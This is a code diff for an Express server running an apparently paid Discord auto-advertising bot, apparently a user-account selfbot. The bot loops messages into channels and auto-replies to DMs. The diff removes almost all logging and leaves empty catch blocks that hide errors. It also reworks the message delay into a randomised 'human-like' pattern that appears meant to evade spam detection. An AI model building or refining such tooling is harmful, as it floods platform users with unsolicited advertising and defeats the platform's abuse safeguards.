-    if (!validation.valid) { console.log(`[REDEEM FAIL] ${validation.error}`); return res.json({ success: false, error: validation.error }); }
+    if (!validation.valid) { return res.json({ success: false, error: validation.error }); }
     const normalizedKey = validation.normalized;
     if (validation.isGenerated) {
       const success = db.useGeneratedKey(normalizedKey, userId);
@@ -1209,25 +1124,19 @@ app.post('/api/redeem', ensureAuthAPI, (req, res) => {
       return res.json({ success: true, message: 'Access granted via generated key!' });
     }
     const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
-    console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
     if (!isValidKey) {
       const customKeys = db.data.customKeys || [];
       const isCustomKey = customKeys.includes(normalizedKey);
-      console.log(`[REDEEM] Key in custom keys? ${isCustomKey}`);
-      if (!isCustomKey) { console.log(`[REDEEM FAIL] Key not found in valid keys`); return res.json({ success: false, error: 'Invalid key' }); }
+      if (!isCustomKey) { return res.json({ success: false, error: 'Invalid key' }); }
     }
     const isUsed = db.isKeyUsed(normalizedKey);
-    console.log(`[REDEEM] Key used? ${isUsed}`);
-    if (isUsed) { console.log(`[REDEEM FAIL] Key already used`); return res.json({ success: false, error: 'Key already used' }); }
+    if (isUsed) { return res.json({ success: false, error: 'Key already used' }); }
     const user = db.getUser(userId);
-    console.log(`[REDEEM] User purchased status: ${user.auto_adv_purchased}`);
-    if (user.auto_adv_purchased === 1) { console.log(`[REDEEM FAIL] User already has access`); return res.json({ success: false, error: 'You already have access' }); }
-    console.log(`[REDEEM SUCCESS] Granting access to ${userId} with key ${normalizedKey}`);
+    if (user.auto_adv_purchased === 1) { return res.json({ success: false, error: 'You already have access' }); }
     db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
     db.useKey(normalizedKey, userId);
     res.json({ success: true, message: 'Access granted!' });
   } catch (err) {
-    console.error('[REDEEM ERROR]', err);
     res.status(500).json({ success: false, error: err.message });
   }
 });
@@ -1271,7 +1180,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             const buffer = Buffer.from(base64Data, 'base64');
             fs.writeFileSync(path.join(imagePath, imageId), buffer);
             savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
-          } catch (imgErr) { console.error('[IMAGE SAVE ERROR]', imgErr); }
+          } catch (imgErr) {}
         } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
           savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
         }
@@ -1292,14 +1201,12 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     let stopped = false;
 
     const msgLoop = async () => {
-      console.log(`[BOT ${configId}] Message loop started. Channels: ${channelList.join(', ')}, Messages: ${messageList.length}, Delay: ${delayMs}ms`);
       while (!stopped && activeBots.has(botKey)) {
         if (db) {
           const user = db.getUser(req.user.id);
           const trialActive = db.isTrialActive(req.user.id);
           const hasPurchase = user.auto_adv_purchased === 1;
           if (!trialActive && !hasPurchase) {
-            console.log(`[BOT ${configId}] Access expired (no trial, no purchase). Stopping loop.`);
             break;
           }
         }
@@ -1313,20 +1220,15 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         }
 
         const sendWithRetry = async (chId, text, files) => {
-          const maxAttempts = 2; // 1 try + 1 retry as requested
+          const maxAttempts = 2;
           for (let attempt = 1; attempt <= maxAttempts; attempt++) {
             try {
               const ok = await client.sendMessage(chId, text, files);
               if (ok) {
-                console.log(`[BOT ${configId}] Sent to ${chId}: "${text.slice(0, 60)}"`);
                 return true;
               }
-              console.warn(`[BOT ${configId}] sendMessage returned false for ${chId} (attempt ${attempt}/${maxAttempts})`);
-            } catch(e) {
-              console.error(`[BOT ${configId}] Send exception to ${chId} (attempt ${attempt}/${maxAttempts}):`, e.message);
-            }
+            } catch(e) {}
             if (attempt < maxAttempts) {
-              // Human-like backoff: wait 2-5s before retry
               const backoff = 2000 + Math.random() * 3000;
               await new Promise(r => setTimeout(r, backoff));
             }
@@ -1359,48 +1261,61 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         }
 
         currentMsgIdx++;
-        // More human-like delay with natural variance (+0-2s)
-        const humanDelay = delayMs * (0.85 + Math.random() * 0.3) + Math.random() * 2000;
+
+        const roll = Math.random();
+        let humanDelay;
+        if (roll < 0.7) {
+          humanDelay = delayMs * (0.85 + Math.random() * 0.3) + Math.random() * 2000;
+        } else if (roll < 0.9) {
+          humanDelay = delayMs * (0.3 + Math.random() * 0.3);
+        } else {
+          humanDelay = delayMs * (2.0 + Math.random() * 2.0);
+        }
         await new Promise(r => setTimeout(r, humanDelay));
       }
-      console.log(`[BOT ${configId}] Message loop exited.`);
     };
 
     if (autoReply && autoReplyText) {
       client.pendingReplies = new Set();
       client.on('messageCreate', async (msg) => {
         if (msg.author.id === client.user.id) return;
-        const isDM = msg.channel_type === 1 || msg.channel_type === 'DM';
+
+        // Only respond to DMs, ignore guild messages entirely
+        const isDM = msg.guild_id === undefined || msg.guild_id === null;
         if (!isDM) return;
+
         if (db) {
           const user = db.getUser(req.user.id);
           const trialActive = db.isTrialActive(req.user.id);
           const hasPurchase = user.auto_adv_purchased === 1;
           if (!trialActive && !hasPurchase) return;
         }
-        if (client.repliedUsers.has(msg.author.id)) {
-          console.log(`[BOT ${configId}] Skipping auto-reply to ${msg.author.username} - already in replied history`);
-          return;
-        }
-        if (client.pendingReplies.has(msg.author.id)) {
-          console.log(`[BOT ${configId}] Skipping auto-reply to ${msg.author.username} - already pending`);
-          return;
-        }
+
+        // 25-second cooldown per sender
+        const now = Date.now();
+        const lastReply = client._dmCooldowns.get(msg.author.id) || 0;
+        if (now - lastReply < 25000) return;
+
+        if (client.repliedUsers.has(msg.author.id)) return;
+        if (client.pendingReplies.has(msg.author.id)) return;
+
         client.pendingReplies.add(msg.author.id);
         await new Promise(r => setTimeout(r, 5000));
         client.pendingReplies.delete(msg.author.id);
         if (!activeBots.has(botKey)) return;
         if (client.repliedUsers.has(msg.author.id)) return;
+
         client.repliedUsers.add(msg.author.id);
         client._saveRepliedUsers();
+        client._dmCooldowns.set(msg.author.id, Date.now());
+
         try {
           await client.sendMessage(msg.channel_id, autoReplyText);
-          console.log(`[BOT ${configId}] Auto-reply sent to ${msg.author.username}`);
         } catch (err) {
           try {
             const dmRes = await client._api('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
             if (dmRes.id) await client.sendMessage(dmRes.id, autoReplyText);
-          } catch(e2) { console.error(`[BOT ${configId}] Auto-reply failed:`, e2.message); }
+          } catch(e2) {}
         }
       });
     }
@@ -1469,12 +1384,9 @@ app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { use
 app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });
 app.get('/dashboard', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'overall.html')); });
 
-app.use((err, req, res, next) => { console.error('[SERVER ERROR]', err); res.status(500).json({ error: err.message }); });
+app.use((err, req, res, next) => { res.status(500).json({ error: err.message }); });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[SERVER] Running on port ${PORT}`);
-  _startNoise();
-});
+app.listen(PORT, '0.0.0.0', () => {});
 
 module.exports = { app, db, activeBots };
